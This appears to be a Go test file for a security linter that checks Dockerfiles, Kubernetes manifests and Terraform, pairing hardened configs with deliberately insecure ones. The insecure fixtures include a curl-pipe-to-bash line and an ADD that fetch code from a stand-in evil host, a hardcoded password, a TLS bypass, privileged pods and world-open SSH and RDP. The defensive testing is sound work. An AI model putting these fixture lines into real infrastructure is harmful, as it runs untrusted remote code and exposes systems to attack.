package iac

import "testing"

func TestDockerfileMultiStageHardenedVsInsecure(t *testing.T) {
	hardened := `FROM golang:1.26-alpine AS builder
WORKDIR /src
RUN go build -o /out/app ./cmd/app

FROM gcr.io/distroless/static-debian12:nonroot
COPY --from=builder /out/app /app
USER nonroot:nonroot
ENTRYPOINT ["/app"]
`
	if f := LintDockerfile(hardened, "file://Dockerfile"); len(f) != 0 {
		t.Fatalf("expected 0 findings on hardened multi-stage Dockerfile, got %+v", f)
	}

	insecure := `FROM ubuntu:latest
ARG DB_PASSWORD=myprodpass
RUN curl -sSL https://evil.invalid/setup.sh | bash
RUN sudo chmod 777 /tmp
ADD https://evil.invalid/bin /usr/local/bin/helper
EXPOSE 22
EXPOSE 8080
`
	hits := LintDockerfile(insecure, "file://Dockerfile.bad")
	rules := make(map[string]bool)
	for _, h := range hits {
		rules[h.RuleID] = true
	}
	for _, want := range []string{"PIPE-201", "PIPE-202", "PIPE-203", "PIPE-204", "PIPE-205", "PIPE-206"} {
		if !rules[want] {
			t.Fatalf("expected %s on insecure Dockerfile, got %+v", want, rules)
		}
	}
}

func TestKubernetesAndTerraformLintersHardenedVsInsecure(t *testing.T) {
	k8sHardened := `apiVersion: apps/v1
kind: Deployment
metadata:
  name: webshield
spec:
  template:
    spec:
      securityContext:
        runAsNonRoot: true
      containers:
        - name: app
          securityContext:
            privileged: false
            runAsNonRoot: true
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true
            capabilities:
              drop: ["ALL"]
          resources:
            limits:
              cpu: "500m"
              memory: "256Mi"
`
	if f := LintKubernetesYAML(k8sHardened, "file://k8s-ok.yaml"); len(f) != 0 {
		t.Fatalf("expected 0 findings on hardened K8s Deployment, got %+v", f)
	}

	k8sBad := `apiVersion: apps/v1
kind: Deployment
metadata:
  name: risky
spec:
  template:
    spec:
      hostPID: true
      containers:
        - name: rootapp
          securityContext:
            privileged: true
`
	kHits := LintKubernetesYAML(k8sBad, "file://k8s-bad.yaml")
	kRules := make(map[string]bool)
	for _, h := range kHits {
		kRules[h.RuleID] = true
	}
	for _, want := range []string{"PIPE-301", "PIPE-302", "PIPE-303"} {
		if !kRules[want] {
			t.Fatalf("expected %s on insecure K8s YAML, got %+v", want, kRules)
		}
	}

	tfHardened := `resource "aws_security_group" "web_https" {
  ingress {
    from_port   = 443
    to_port     = 443
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }
}
resource "aws_ebs_volume" "data" {
  encrypted = true
}
`
	if f := LintTerraform(tfHardened, "file://main.tf"); len(f) != 0 {
		t.Fatalf("expected 0 findings on hardened HTTPS Terraform config, got %+v", f)
	}

	tfBad := `resource "aws_security_group" "ssh_world" {
  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }
}
resource "aws_s3_bucket" "public_logs" {
  acl = "public-read"
}
resource "aws_db_instance" "db" {
  storage_encrypted = false
}
`
	tHits := LintTerraform(tfBad, "file://bad.tf")
	if len(tHits) != 3 {
		t.Fatalf("expected 3 PIPE-304 Terraform findings, got %d: %+v", len(tHits), tHits)
	}
}

func TestDockerfileARGAndMultiCloudTerraform(t *testing.T) {
	// Bypass case: ARG TAG=latest resolved inside FROM + curl -k TLS bypass.
	dfArg := `ARG TAG=latest
FROM alpine:$TAG
RUN adduser -D app && curl -k https://example.invalid/bin -o /tmp/bin
USER app
`
	dfHits := LintDockerfile(dfArg, "file://Dockerfile")
	seenDF := make(map[string]bool)
	for _, h := range dfHits {
		seenDF[h.RuleID] = true
	}
	if !seenDF["PIPE-202"] || !seenDF["PIPE-204"] {
		t.Fatalf("expected PIPE-202 (ARG :latest) and PIPE-204 (curl -k), got %+v", dfHits)
	}

	dfArgPinned := "ARG BASE_TAG=3.21.3\nFROM alpine:${BASE_TAG}\nRUN adduser -D app\nUSER app\n"
	if hits := LintDockerfile(dfArgPinned, "file://Dockerfile.pinned"); len(hits) != 0 {
		t.Fatalf("expected 0 findings when ARG resolves to pinned tag, got %+v", hits)
	}

	// Terraform variable indirection + GCP PIPE-305 + Azure PIPE-306.
	tfMultiCloud := `
variable "cidr" {
  default = "0.0.0.0/0"
}

resource "aws_security_group" "var_open" {
  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = [var.cidr]
  }
}

resource "google_compute_firewall" "gcp_open" {
  name          = "allow-ssh"
  source_ranges = ["0.0.0.0/0"]
  allow {
    protocol = "tcp"
    ports    = ["22"]
  }
}

resource "azurerm_network_security_rule" "az_rdp" {
  name                        = "allow-rdp"
  direction                   = "Inbound"
  access                      = "Allow"
  source_address_prefix       = "*"
  destination_port_range      = "3389"
}

resource "azurerm_storage_account" "az_pub" {
  name                            = "pubstg"
  allow_nested_items_to_be_public = true
  https_traffic_only_enabled      = false
}
`
	tfHits := LintTerraform(tfMultiCloud, "file://multi.tf")
	seenTF := make(map[string]int)
	for _, h := range tfHits {
		seenTF[h.RuleID]++
	}
	if seenTF["PIPE-304"] != 1 || seenTF["PIPE-305"] != 1 || seenTF["PIPE-306"] != 2 {
		t.Fatalf("expected PIPE-304=1, PIPE-305=1, PIPE-306=2, got %+v (all=%+v)", seenTF, tfHits)
	}
}
